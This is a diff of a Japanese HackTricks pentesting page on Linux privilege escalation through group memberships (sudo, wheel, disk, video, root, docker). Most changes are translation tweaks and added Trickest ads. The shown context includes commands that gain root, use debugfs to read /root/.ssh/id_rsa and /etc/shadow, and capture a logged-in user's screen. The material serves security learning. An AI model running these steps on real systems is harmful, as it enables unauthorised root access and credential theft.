@@ -13,12 +13,18 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
+<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
-# Sudo/Admin グループ
+Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+Get Access Today:
 
-## **PE - メソッド 1**
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
-**時々**、**デフォルトで \(またはいくつかのソフトウェアが必要とするため\)** **/etc/sudoers** ファイル内にこれらの行のいくつかを見つけることができます:
+# Sudo/Admin Groups
+
+## **PE - Method 1**
+
+**時々、** **デフォルトで（またはいくつかのソフトウェアが必要とするために）** **/etc/sudoers** ファイル内にこれらの行のいくつかを見つけることができます:
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -34,11 +40,11 @@ sudo su
 ```
 ## PE - Method 2
 
-すべてのsuidバイナリを見つけ、バイナリ**Pkexec**があるか確認します:
+すべてのsuidバイナリを見つけ、バイナリ**Pkexec**があるかどうかを確認します:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-もしバイナリ pkexec が SUID バイナリであり、あなたが sudo または admin に属している場合、pkexec を使用して sudo としてバイナリを実行できる可能性があります。以下の内容を確認してください:
+もしバイナリ pkexec が SUID バイナリであり、あなたが sudo または admin に属している場合、pkexec を使用して sudo としてバイナリを実行できる可能性があります。次の内容を確認してください:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
@@ -54,7 +60,7 @@ polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freed
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**GUIがないために接続されていないのではなく、権限がないからではありません**。この問題の回避策はここにあります: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。**2つの異なるsshセッション**が必要です：
+**権限がないからではなく、GUIなしで接続されていないからです**。この問題の回避策があります: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。**2つの異なるsshセッション**が必要です:
 
 {% code title="session1" %}
 ```bash
@@ -79,7 +85,7 @@ pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 ```
 これは、**wheelグループに属する任意のユーザーがsudoとして何でも実行できる**ことを意味します。
 
-この場合、**rootになるには次のように実行するだけです**:
+この場合、**rootになるには、単に次を実行すればよい**:
 ```text
 sudo su
 ```
@@ -103,7 +109,7 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-注意として、debugfsを使用すると**ファイルを書き込む**こともできます。例えば、`/tmp/asd1.txt`を`/tmp/asd2.txt`にコピーするには、次のようにします:
+注意してほしいのは、debugfsを使用すると**ファイルを書き込む**こともできるということです。例えば、`/tmp/asd1.txt`を`/tmp/asd2.txt`にコピーするには、次のようにします：
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
@@ -120,7 +126,7 @@ moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
 **tty1**は、ユーザー**yossiが物理的に**マシンのターミナルにログインしていることを意味します。
 
-**videoグループ**は、画面出力を表示するアクセス権を持っています。基本的に、画面を観察することができます。それを行うには、**画面上の現在の画像を生データで取得**し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存され、解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
+**videoグループ**は、画面出力を表示するアクセス権を持っています。基本的に、画面を観察することができます。そのためには、**画面上の現在の画像を**生データで取得し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存でき、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
@@ -135,7 +141,7 @@ cat /sys/class/graphics/fb0/virtual_size
 
 # ルートグループ
 
-デフォルトでは、**ルートグループのメンバー**は、**サービス**の設定ファイルや**ライブラリ**ファイル、または特権昇格に使用できる**その他の興味深いもの**を**変更**するアクセス権を持っているようです...
+デフォルトでは、**ルートグループのメンバー**は、**サービス**の設定ファイルや**ライブラリ**ファイル、または特権昇格に使用できる**他の興味深いもの**を**変更**するアクセス権を持っているようです...
 
 **ルートメンバーが変更できるファイルを確認する**：
 ```bash
@@ -143,7 +149,7 @@ find / -group root -perm -g=w 2>/dev/null
 ```
 # Docker Group
 
-ホストマシンのルートファイルシステムをインスタンスのボリュームにマウントできます。インスタンスが起動すると、そのボリュームに`chroot`を即座にロードします。これにより、実質的にマシン上でルート権限を得ることができます。
+ホストマシンのルートファイルシステムをインスタンスのボリュームにマウントできます。インスタンスが起動すると、すぐにそのボリュームに`chroot`をロードします。これにより、実質的にマシン上でルート権限を得ることができます。
 
 {% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
 
@@ -153,17 +159,24 @@ find / -group root -perm -g=w 2>/dev/null
 
 [lxc - Privilege Escalation](lxd-privilege-escalation.md)
 
+<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+
+[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection)を使用して、世界で最も高度なコミュニティツールによって駆動される**ワークフローを簡単に構築し、自動化**します。\
+今すぐアクセスを取得：
+
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
+
 {% hint style="success" %}
-AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWSハッキングを学び、練習する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、練習する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>HackTricksをサポートする</summary>
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
-* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
-* **[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してハッキングトリックを共有してください。**
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* [**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してハッキングトリックを共有してください。
 
 </details>
 {% endhint %}
